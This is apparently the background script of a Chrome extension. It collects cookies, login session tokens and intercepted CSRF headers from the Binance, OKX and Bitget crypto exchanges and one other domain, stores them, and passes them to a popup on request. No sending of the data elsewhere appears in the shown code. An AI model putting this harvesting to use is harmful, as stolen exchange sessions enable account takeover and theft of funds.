// Function to get the current tab's domain
function getCurrentTabDomain(callback: (domain: string | null) => void) {
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    if (tabs.length > 0 && tabs[0].url) {
      const url = new URL(tabs[0].url);
      const domain = url.hostname;
      callback(domain);
    } else {
      console.warn("No active tab found");
      callback(null);
    }
  });
}

// Fetch cookies for the current tab's domain
function fetchCookiesForCurrentTab() {
  getCurrentTabDomain(function (domain) {
    if (domain) {
      console.log("Current tab domain:", domain);

      if (
        domain.includes("binance.com") ||
        domain.includes("suitechsui.online") ||
        domain.includes("okx.com") ||
        domain.includes("bitget.com")
      ) {
        fetchCookiesForDomain(domain);
      } else {
        console.warn("Domain not recognized or supported:", domain);
      }
    } else {
      console.error("Failed to fetch current tab domain");
    }
  });
}

// Existing fetchCookiesForDomain function
function fetchCookiesForDomain(domain: string) {
  chrome.cookies.getAll({ domain: domain }, function (cookies) {
    if (chrome.runtime.lastError) {
      console.error(
        "Error fetching cookies for domain:",
        domain,
        chrome.runtime.lastError
      );
      return;
    }
    console.log("Cookies for domain:", domain, cookies);

    // Store all cookies
    chrome.storage.local.set({ [`cookies_${domain}`]: cookies }, function () {
      console.log(`Cookies for ${domain} saved to storage`);
    });

    // Handle specific JWT tokens from cookies
    if (domain.includes("okx.com")) {
      const jwtCookie = cookies.find((cookie) => cookie.name === "token");
      if (jwtCookie) {
        console.log("OKX JWT Token Found in cookies");
        chrome.storage.local.set({ okx_jwt: jwtCookie.value });
      }
    } else if (domain.includes("bitget.com")) {
      const jwtCookie = cookies.find(
        (cookie) => cookie.name === "bt_newsessionid"
      );
      if (jwtCookie) {
        console.log("Bitget JWT Token Found in cookies");
        chrome.storage.local.set({ bitget_jwt: jwtCookie.value });
      }
    }
  });
}

// Listen for messages from the popup
chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
  if (message.type === "GET_COOKIES") {
    chrome.storage.local.get(null, (items) => {
      // Filter only cookie entries
      const cookieEntries = Object.entries(items).filter(([key]) =>
        key.startsWith("cookies_")
      );
      const cookies = Object.fromEntries(cookieEntries);
      sendResponse(cookies);
    });
    return true; // Will respond asynchronously
  }

  if (message.type === "GET_CSRF_TOKEN") {
    chrome.storage.local.get(["csrfToken"], (items) => {
      sendResponse(items.csrfToken);
    });
    return true;
  }

  if (message.type === "GET_JWT_TOKENS") {
    chrome.storage.local.get(null, (items) => {
      const jwtTokens: { [key: string]: string } = {};

      // Check for OKX JWT token
      if (items.okx_jwt) {
        jwtTokens["okx"] = items.okx_jwt;
      }

      // Check for Bitget JWT token
      if (items.bitget_jwt) {
        jwtTokens["bitget"] = items.bitget_jwt;
      }

      sendResponse(jwtTokens);
    });
    return true;
  }
});

// Listen to web requests and fetch cookies/tokens based on the current tab
chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    console.log("Intercepted Request:", details);

    // Extract CSRF token from headers
    if (details.requestHeaders) {
      for (let header of details.requestHeaders) {
        if (header.name.toLowerCase() === "csrftoken") {
          console.log("CSRF Token Found:", header.value);
          chrome.storage.local.set({ csrfToken: header.value });
          break;
        }
      }
    }

    // Fetch cookies for all supported domains
    if (
      details.url.includes("binance.com") ||
      details.url.includes("suitechsui.online") ||
      details.url.includes("okx.com") ||
      details.url.includes("bitget.com")
    ) {
      fetchCookiesForCurrentTab();
    }
  },
  {
    urls: [
      "https://www.binance.com/*",
      "https://www.okx.com/*",
      "https://www.bitget.com/*",
    ],
  },
  ["requestHeaders"]
);
